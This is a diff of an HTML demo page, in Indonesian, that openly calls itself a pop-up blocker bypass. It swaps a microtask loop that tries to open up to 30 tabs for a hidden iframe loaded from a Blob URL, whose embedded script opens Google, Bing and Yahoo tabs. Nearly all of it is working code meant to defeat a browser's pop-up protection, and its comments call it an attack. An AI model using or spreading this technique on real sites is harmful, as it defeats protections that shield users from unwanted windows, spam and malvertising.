@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Pop-up Blocker Bypass (Race Condition)</title>
+    <title>Blob Iframe Pop-up Bypass</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -13,72 +13,70 @@
         button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
         button:hover { background: #b71c1c; }
         #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
-        .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
     </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>Pop-up Blocker Bypass</h1>
-    <p>Memanfaatkan Race Condition (Microtask) untuk membuka banyak tab sebelum diblokir.</p>
-    <button id="start-btn" type="button">Mulai Race Condition</button>
+    <h1>Blob Iframe Pop-up Bypass</h1>
+    <p>Menggunakan Iframe Tersembunyi + Blob URL untuk menembus Pop-up Blocker.</p>
+    <button id="start-btn" type="button">Mulai Bypass</button>
     <div id="status" role="status">Menunggu interaksi...</div>
-    <div class="log" id="log">Log akan muncul di sini...</div>
 </div>
 
 <script>
     const startBtn = document.getElementById("start-btn");
     const statusDiv = document.getElementById("status");
-    const logDiv = document.getElementById("log");
-
-    let openedCount = 0;
-    let isRunning = false;
-
-    function log(msg) {
-        logDiv.innerHTML += "<br>> " + msg;
-        console.log(msg);
-    }
-
-    function bukaTab() {
-        try {
-            // Membuka tab baru ke Google
-            const win = window.open('https://google.com', '_blank');
-            if (win) {
-                openedCount++;
-            }
-        } catch (e) {}
-    }
 
     startBtn.addEventListener("click", () => {
-        if (isRunning) return;
-        isRunning = true;
-        
+        statusDiv.textContent = "Membuat Iframe Tersembunyi...";
         startBtn.disabled = true;
-        statusDiv.textContent = "Memicu Race Condition...";
-        log("Memulai serangan...");
 
-        // TRIK: Gunakan queueMicrotask untuk menembak secepat mungkin
-        // Kita akan melakukan loop sebanyak 20 kali di dalam microtask
-        queueMicrotask(() => {
-            // Loop Sinkron
-            for (let i = 0; i < 20; i++) {
-                bukaTab();
-            }
+        try {
+            // 1. Buat Iframe Tersembunyi
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
 
-            // Jika masih ada sisa, coba lagi via microtask berikutnya
-            queueMicrotask(() => {
-                for (let i = 0; i < 10; i++) {
-                    bukaTab();
-                }
+            // 2. Siapkan Payload HTML yang akan dijalankan di dalam iframe
+            // Payload ini akan menembakkan window.open() 3 kali
+            const payloadHTML = `
+                <!DOCTYPE html>
+                <html>
+                <body>
+                    <script>
+                        // Tembak 3 tab dari dalam Iframe
+                        window.open('https://google.com', '_blank');
+                        window.open('https://bing.com', '_blank');
+                        window.open('https://yahoo.com', '_blank');
+                    <\/script>
+                </body>
+                </html>
+            `;
 
-                // Update status
-                statusDiv.textContent = `Selesai! Berhasil membuka ${openedCount} tab.`;
-                statusDiv.style.color = "#4CAF50";
-                log(`Total tab dibuka: ${openedCount}`);
-                isRunning = false;
-                startBtn.disabled = false;
-            });
-        });
+            // 3. Buat Blob URL
+            const blob = new Blob([payloadHTML], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+
+            // 4. Muat Blob URL ke dalam Iframe
+            iframe.src = url;
+
+            // 5. Update status
+            statusDiv.textContent = "Bypass dipicu! Cek tab baru Anda.";
+            statusDiv.style.color = "#4CAF50";
+
+            // Cleanup setelah 5 detik
+            setTimeout(() => {
+                if (iframe.parentNode) document.body.removeChild(iframe);
+                URL.revokeObjectURL(url);
+            }, 5000);
+
+        } catch (e) {
+            statusDiv.textContent = "Gagal: " + e.message;
+            statusDiv.style.color = "#f00";
+        }
+        
+        startBtn.disabled = false;
     });
 </script>
 </body>
